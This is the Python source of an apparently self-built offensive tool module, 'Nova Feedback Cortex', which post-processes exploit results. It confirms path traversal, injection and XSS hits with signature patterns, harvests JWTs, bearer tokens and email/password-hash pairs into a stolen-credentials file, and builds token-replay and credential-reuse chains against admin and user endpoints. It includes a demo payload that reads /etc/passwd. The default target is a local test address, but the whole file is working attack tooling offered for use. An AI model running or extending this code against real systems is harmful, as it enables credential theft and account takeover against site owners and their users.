#!/usr/bin/env python3
"""
NOVA FEEDBACK CORTEX v1.0
Self-learning module: validates results, extracts deeper data,
chains exploits, and feeds intelligence back to the graph brain.
Zero tokens. Zero cloud. Pure on-device cognition.
"""

import json
import re
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin


class NovaFeedbackCortex:
    """
    The learning layer. Takes raw exploit results and:
    1. Validates partial successes (did path traversal actually work?)
    2. Extracts credentials/tokens for chaining
    3. Updates graph brain risk scores
    4. Builds a signature database of what works
    """

    def __init__(
        self,
        base_url: str = "http://localhost:3000",
        graph_file: str = "nova_memory.json",
        signature_file: str = "nova_signatures.json",
        credential_file: str = "nova_credentials.json",
    ):
        self.base_url = base_url
        self.graph_file = graph_file
        self.signature_file = signature_file
        self.credential_file = credential_file

        self.signatures = self._load_json(signature_file, default={"exploit_patterns": [], "successful_payloads": []})
        self.stolen_credentials = self._load_json(credential_file, default={"tokens": [], "credentials": [], "sessions": []})
        self.graph = self._load_json(graph_file, default={"nodes": {}, "edges": []})

        self.learning_rate = 0.1  # How fast confidence adjusts
        self.validation_patterns = self._compile_validation_patterns()

    # ---------- PERSISTENCE ----------
    def _load_json(self, path: str, default=None):
        try:
            with open(path, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return default if default is not None else {}

    def _save_json(self, path: str, data):
        with open(path, "w") as f:
            json.dump(data, f, indent=2)

    # ---------- VALIDATION PATTERNS ----------
    def _compile_validation_patterns(self) -> Dict[str, List[str]]:
        """Patterns that confirm a vulnerability is real."""
        return {
            "path_traversal": [
                r"root:.*:0:0:",           # /etc/passwd
                r"daemon:.*:1:1:",
                r"bin:.*:2:2:",
                r"\[extensions\]",          # Windows ini
                r"root:x:0:0:",
                r"www-data:",
                r"nobody:.*:65534:",
            ],
            "sql_injection": [
                r"password.*hash",
                r"email.*@.*\.",
                r"role.*admin",
                r"credit.*card",
                r"ssn",
            ],
            "xss_stored": [
                r"<script>.*NOVA",
                r"onerror.*NOVA",
                r"NOVA_PWNED",
                r"NOVA_XSS",
            ],
            "auth_bypass": [
                r"eyJ.*\.eyJ.*\..*",        # JWT token
                r"token.*:.*\"[^\"]{20,}\"",
                r"Bearer\s+[A-Za-z0-9\-._~+/]+=*",
            ],
            "ssrf": [
                r"internal.*admin",
                r"admin.*panel",
                r"root:x:",
            ],
            "command_injection": [
                r"uid=\d+.*gid=\d+",
                r"groups=\d+",
            ],
        }

    # ---------- DEEP VALIDATION ----------
    def validate_partial(self, result: Dict, response_body: str = None) -> bool:
        """
        Takes a 'partial' success and determines if it's actually a full win.
        Returns True if validated as real exploit.
        """
        exploit_type = result.get("exploit_type", "")
        patterns = self.validation_patterns.get(exploit_type, [])

        if not response_body:
            response_body = result.get("response_preview", "")

        for pattern in patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                print(f"     🔬 DEEP VALIDATION: Pattern '{pattern}' found in response!")
                return True

        return False

    # ---------- CREDENTIAL EXTRACTION ----------
    def extract_credentials(self, result: Dict) -> Dict:
        """Extract usable credentials and tokens from exploit responses."""
        extracted = {"tokens": [], "credentials": [], "emails": [], "roles": []}
        body = result.get("response_preview", "")

        # Extract JWT tokens
        jwt_pattern = r'(eyJ[A-Za-z0-9\-._~+/]+=*)'
        tokens = re.findall(jwt_pattern, body)
        for token in tokens:
            if len(token) > 50:
                extracted["tokens"].append(token)

        # Extract Bearer tokens
        bearer_pattern = r'Bearer\s+([A-Za-z0-9\-._~+/]+=*)'
        bearer_tokens = re.findall(bearer_pattern, body)
        extracted["tokens"].extend(bearer_tokens)

        # Extract email:password pairs from SQL dumps
        email_pass_pattern = r'"email"\s*:\s*"([^"]+)".*?"password"\s*:\s*"([^"]+)"'
        for match in re.finditer(email_pass_pattern, body, re.DOTALL):
            extracted["credentials"].append({
                "email": match.group(1),
                "password_hash": match.group(2),
                "source": result["endpoint"],
            })
            extracted["emails"].append(match.group(1))

        # Extract role information
        role_pattern = r'"role"\s*:\s*"([^"]+)"'
        roles = re.findall(role_pattern, body)
        extracted["roles"].extend(roles)

        # Deduplicate
        extracted["tokens"] = list(set(extracted["tokens"]))
        extracted["emails"] = list(set(extracted["emails"]))
        extracted["roles"] = list(set(extracted["roles"]))

        return extracted

    # ---------- GRAPH UPDATING ----------
    def update_graph_confidence(self, result: Dict, success: bool):
        """Feed exploit results back into graph brain to adjust confidence scores."""
        endpoint = result.get("endpoint", "")
        exploit_type = result.get("exploit_type", "")

        # Find or create node
        node_id = endpoint.replace("/", "_").strip("_")
        if node_id not in self.graph.get("nodes", {}):
            self.graph.setdefault("nodes", {})[node_id] = {
                "endpoint": endpoint,
                "risk_score": 0.5,
                "vulnerability_types": [],
                "exploit_count": 0,
                "success_count": 0,
            }

        node = self.graph["nodes"][node_id]
        node["exploit_count"] = node.get("exploit_count", 0) + 1

        if success:
            node["success_count"] = node.get("success_count", 0) + 1
            # Increase risk score
            node["risk_score"] = min(1.0, node.get("risk_score", 0.5) + self.learning_rate)
            if exploit_type not in node.get("vulnerability_types", []):
                node["vulnerability_types"].append(exploit_type)
        else:
            # Slightly decrease if no success after many attempts
            if node["exploit_count"] > 5 and node.get("success_count", 0) == 0:
                node["risk_score"] = max(0.1, node.get("risk_score", 0.5) - self.learning_rate * 0.5)

        self._save_json(self.graph_file, self.graph)

    # ---------- SIGNATURE LEARNING ----------
    def learn_signature(self, result: Dict):
        """Build a fingerprint database of successful exploit patterns."""
        if result.get("success") != True:
            return

        signature = {
            "timestamp": datetime.now().isoformat(),
            "endpoint": result["endpoint"],
            "method": result["method"],
            "exploit_type": result["exploit_type"],
            "payload": result["payload"],
            "indicators": result.get("indicators_found", []),
            "status_code": result["status_code"],
            "response_length": result.get("response_length", 0),
        }

        # Avoid duplicates
        existing = self.signatures.get("successful_payloads", [])
        if not any(
            s["endpoint"] == signature["endpoint"]
            and s["payload"] == signature["payload"]
            for s in existing
        ):
            existing.append(signature)
            self.signatures["successful_payloads"] = existing
            self._save_json(self.signature_file, self.signatures)
            print(f"     🧬 SIGNATURE LEARNED: {signature['exploit_type']} on {signature['endpoint']}")

    # ---------- CHAIN BUILDING ----------
    def build_chains(self) -> List[Dict]:
        """
        Use stolen credentials to build privilege escalation chains.
        If we have a token, what admin endpoints can we hit?
        """
        chains = []
        tokens = self.stolen_credentials.get("tokens", [])
        credentials = self.stolen_credentials.get("credentials", [])

        if tokens:
            # Build chains that use the stolen token
            for token in tokens[:3]:  # Top 3 tokens
                chains.append({
                    "name": "Token Replay Chain",
                    "token": token,
                    "steps": [
                        {"endpoint": "/api/Users", "method": "GET", "purpose": "Enumerate all users"},
                        {"endpoint": "/rest/admin/application-configuration", "method": "GET", "purpose": "Read app config"},
                        {"endpoint": "/rest/admin/application-version", "method": "GET", "purpose": "Version disclosure"},
                        {"endpoint": "/api/Feedbacks", "method": "GET", "purpose": "Read all feedback"},
                    ],
                })

        if credentials:
            # Build credential-stuffing chains
            for cred in credentials[:3]:
                chains.append({
                    "name": "Credential Reuse Chain",
                    "credentials": cred,
                    "steps": [
                        {"endpoint": "/rest/user/login", "method": "POST", "purpose": "Login as user"},
                        {"endpoint": "/rest/user/change-password", "method": "GET", "purpose": "Check password reset"},
                        {"endpoint": "/rest/basket/{id}", "method": "GET", "purpose": "Access user basket"},
                    ],
                })

        return chains

    # ---------- MAIN PROCESSING LOOP ----------
    def process_results(self, results: List[Dict]) -> Dict:
        """
        Main entry point: process all exploit results, extract value,
        update intelligence, and build chains.
        """
        print("\n" + "═" * 60)
        print("🧠 NOVA FEEDBACK CORTEX: Processing Results")
        print("═" * 60)

        validated_count = 0
        credentials_extracted = 0
        new_signatures = 0
        chains_built = 0

        for result in results:
            original_success = result.get("success")

            # Step 1: Validate partial results
            if original_success == "partial":
                if self.validate_partial(result):
                    result["success"] = True
                    validated_count += 1
                    print(f"\n   ✅ UPGRADED: {result['endpoint']} — PARTIAL → CONFIRMED")

            # Step 2: If successful, extract credentials
            if result.get("success") == True:
                extracted = self.extract_credentials(result)
                if extracted["tokens"]:
                    self.stolen_credentials["tokens"].extend(extracted["tokens"])
                    self.stolen_credentials["tokens"] = list(set(self.stolen_credentials["tokens"]))
                    credentials_extracted += len(extracted["tokens"])
                    print(f"   🔑 TOKEN CAPTURED: {extracted['tokens'][0][:50]}...")

                if extracted["credentials"]:
                    self.stolen_credentials["credentials"].extend(extracted["credentials"])
                    credentials_extracted += len(extracted["credentials"])
                    print(f"   👤 CREDENTIALS STOLEN: {len(extracted['credentials'])} accounts")

                # Step 3: Learn signature
                prev_sig_count = len(self.signatures.get("successful_payloads", []))
                self.learn_signature(result)
                new_sig_count = len(self.signatures.get("successful_payloads", []))
                if new_sig_count > prev_sig_count:
                    new_signatures += 1

            # Step 4: Update graph brain
            self.update_graph_confidence(result, result.get("success") == True)

        # Save stolen credentials
        self._save_json(self.credential_file, self.stolen_credentials)

        # Step 5: Build chains
        chains = self.build_chains()
        chains_built = len(chains)

        # Generate report
        report = {
            "timestamp": datetime.now().isoformat(),
            "results_processed": len(results),
            "partial_upgraded_to_confirmed": validated_count,
            "credentials_extracted": credentials_extracted,
            "total_stolen_tokens": len(self.stolen_credentials.get("tokens", [])),
            "total_stolen_credentials": len(self.stolen_credentials.get("credentials", [])),
            "new_signatures_learned": new_signatures,
            "chains_built": chains_built,
            "top_chains": chains[:3],
            "high_value_credentials": self.stolen_credentials.get("credentials", [])[:5],
        }

        print("\n" + "═" * 60)
        print("📊 FEEDBACK CORTEX REPORT")
        print("═" * 60)
        print(f"   Processed: {report['results_processed']} results")
        print(f"   Upgraded: {report['partial_upgraded_to_confirmed']} partial → confirmed")
        print(f"   Credentials: {report['credentials_extracted']} newly extracted")
        print(f"   Total Tokens: {report['total_stolen_tokens']}")
        print(f"   Total Creds: {report['total_stolen_credentials']}")
        print(f"   New Signatures: {report['new_signatures_learned']}")
        print(f"   Chains Built: {report['chains_built']}")
        print("═" * 60)

        return report

    def process(self, findings: List[Dict]) -> Dict:
        """Pipeline entry point — called by NovaPipeline.phase_feedback().
        Converts generic Nova finding dicts to the format process_results() expects,
        then returns the full chained-exploit report."""
        normalised = []
        for f in findings:
            normalised.append({
                "endpoint":        f.get("url", f.get("endpoint", "")),
                "exploit_type":    f.get("type", "unknown"),
                "success":         True if str(f.get("severity","")).upper() in ("CRITICAL","HIGH") else "partial",
                "payload":         f.get("payload", f.get("evidence", "")),
                "response_body":   f.get("response", ""),
                "indicators_found": f.get("indicators", f.get("evidence", [])),
                "severity":        f.get("severity", "info"),
                "method":          f.get("method", "GET"),
            })
        result = self.process_results(normalised)
        result["chained_exploits"] = result.get("top_chains", [])
        return result


# ---------- INTEGRATION WITH EXPLOIT SYNTHESIZER ----------
if __name__ == "__main__":
    import sys

    print("""
╔═══════════════════════════════════════╗
║   NOVA FEEDBACK CORTEX v1.0          ║
║   Self-Learning Exploit Validator    ║
╚═══════════════════════════════════════╝
    """)

    cortex = NovaFeedbackCortex()

    # Load last exploit results if available
    try:
        from nova_exploit_synthesizer import NovaExploitSynthesizer
        synthesizer = NovaExploitSynthesizer()
        results = synthesizer.results

        if not results:
            print("[!] No exploit results in memory. Run nova_exploit_synthesizer.py first.")
            sys.exit(1)

        print(f"[*] Loaded {len(results)} results from NovaExploitSynthesizer")
        report = cortex.process_results(results)

        print("\n[*] Stolen Credentials:")
        for cred in cortex.stolen_credentials.get("credentials", [])[:5]:
            print(f"    📧 {cred.get('email')} | Hash: {cred.get('password_hash', 'N/A')[:40]}...")

        print("\n[*] Stolen Tokens:")
        for token in cortex.stolen_credentials.get("tokens", [])[:3]:
            print(f"    🔐 {token[:60]}...")

        print("\n[*] Suggested Attack Chains:")
        for chain in report.get("top_chains", []):
            print(f"    ⛓️  {chain['name']}: {len(chain['steps'])} steps")

    except ImportError:
        print("[!] Could not import NovaExploitSynthesizer.")
        print("[*] Running demo with sample data...")

        # Demo with a simulated partial path traversal result
        sample_results = [
            {
                "endpoint": "/file-serving",
                "method": "GET",
                "exploit_type": "path_traversal",
                "payload": "../../../etc/passwd",
                "status_code": 200,
                "success": "partial",
                "response_preview": 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
                "response_length": 450,
            }
        ]
        report = cortex.process_results(sample_results)
        print(f"\n[*] Demo Result: {report['partial_upgraded_to_confirmed']} partial upgrades")

    print("\n🧠 Feedback Cortex complete. Intelligence saved.")
